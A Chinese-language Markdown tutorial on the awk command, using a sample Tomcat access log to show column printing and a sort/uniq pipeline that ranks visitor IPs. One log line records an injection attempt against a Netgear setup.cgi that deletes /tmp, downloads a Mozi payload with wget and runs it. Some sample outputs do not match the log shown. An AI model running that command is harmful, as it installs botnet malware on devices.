---
title: awk
---
### awk 命令
::: tip awk
awk([ɔk]),这个命令玩的转不转，就是Linux菜不菜的分水岭了

grep命令中已经提到了，Linux有三个重要的命令，一个是grep，一个是awk，还有一个是sed

我在这里介绍几个我工作中用到的案例

:::
#### 先讲讲怎么用
我们先拿一个tomcat的access(部分)日志做demo
``` bash
288.208.60.115 - connector-87 - [27/May/2019:20:38:14 +0800] "GET /webapps/bb-silkV-bb_bb60/dist/js/libs/jquery.min.js HTTP/1.1" 200 33637 "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.118 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "session_id=7AAE94F365F73328FBA4DAB21173D6D1; s_session_id=3A8546E486A7AADABCB39E9EB95E0DD3; web_client_cache_guid=9b548065-a3b9-42cc-be7b-cf2974c5f332" 72 33637
88.228.10.180 - connector-110 - [27/May/2019:20:57:20 +0800] "GET /js/zimbraMail/share/model/ZmSettings.js HTTP/1.1" 404 8158 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "-" 129 8158
222.82.47.4 - connector-116 - [27/May/2019:20:59:54 +0800] "GET / HTTP/1.1" 200 206 "-" "-" 2 206
222.23.34.151 - connector-103 - [27/May/2019:21:05:39 +0800] "POST //webapps/software-updates/registrar/checkCallbackToken HTTP/1.1" 200 - "AHC/1.0" "-" 6 -
123.35.168.245 - connector-108 - [27/May/2019:21:18:41 +0800] "GET / HTTP/1.1" 200 206 "-" "-" 2 206
192.35.168.245 - connector-82 - [27/May/2019:21:18:42 +0800] "GET / HTTP/1.1" 200 193 "Mozilla/5.0 zgrab/0.x" "-" 2 193
123.248.147.78 - - - [27/May/2019:21:22:42 +0800] "GET /wptest/wp-login.php HTTP/1.1" 301 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-" 1 -
123.248.147.78 - connector-89 - [27/May/2019:21:22:44 +0800] "GET /wptest/wp-login.php HTTP/1.1" 404 8158 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-" 32 8158
123.97.174.122 - - - [27/May/2019:22:46:45 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 - "-" "-" 1 -
123.159.6.192 - - - [27/May/2019:22:46:47 +0800] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 301 - "XTC" "-" 0 -
```

使用下面的命令
``` bash
[root@xxx tomcat]# awk '{print $1}' access-log.2019-05-27.txt
```
返回结果
``` bash
47.95.28.143
162.212.114.160
162.243.129.111
144.217.207.24
3.82.144.251
3.82.144.251
80.82.70.187
3.82.144.251
218.161.125.93
107.23.34.151
```
那如果使用$2呢？
``` bash
[root@xxx tomcat]# awk '{print $2}' access-log.2019-05-27.txt
```
返回结果
``` bash
-
-
-
-
-
-
-
-
-
-
-
-
-
```
看得出来，这个命令是按列输出的，默认以空格分割，并且awk '{print $1}' xxx.txt为输出第一列

而不是$0,实际上awk '{print $0}' xxx.txt是全列输出

#### 实践一下
``` bash
cat access-log.2019-05-27.txt |sort  -t '-' -k1n |awk '{print $1}'|uniq -c|sort -k1nr|head -10
```
这条命令的作用是统计访问量排在前10的IP
``` bash
11 64.x64.104.xx
6 107.x23.34.xx
4 123.x55.192.xx
4 171.x67.70.xx
3 192.x35.168.xx
3 193.x174.89.xx
3 3.x82.144.xx
3 80.x82.70.xx
2 104.x248.147.xx
2 106.x11.157.xx
```
解释一下（这就需要一点知识的整合了）

把文件输出出来，没什么毛病
``` bash
cat access-log.2019-05-27.txt
```
Linux管道符开始传递，将上一步输出的结果，按'-'分割，k1n的意思是按分割后的第一列进行数字比较排序
``` bash
sort  -t '-' -k1n 
```
awk命令打印第一行
``` bash
awk '{print $1}'
```
由于上上步已经sort排序了，并且awk只打印了第一列，IP列，所以uniq不用排序，直接可以distinct
``` bash
uniq -c
```
uniq后，第一列就变成count数了，这个时候再sort一下，k1nr，最后这个参数r就是倒序的意思
``` bash
sort -k1nr
```
最最后再head -10，从前到后选10个
``` bash
head -10
```

#### 扩展
除了上面讲的pring $1

awk的花样还很多，输出时可以自定义分隔符，输入时也可以自定义分隔符
甚至输出时可以写判断条件，还可以写逻辑函数，这些我就不多介绍了，实际用到时，再百度即可

不过这个命令真的很重要，玩的溜，在服务器上可以做很多事半功倍的事情，唯手熟尔啦:sunglasses: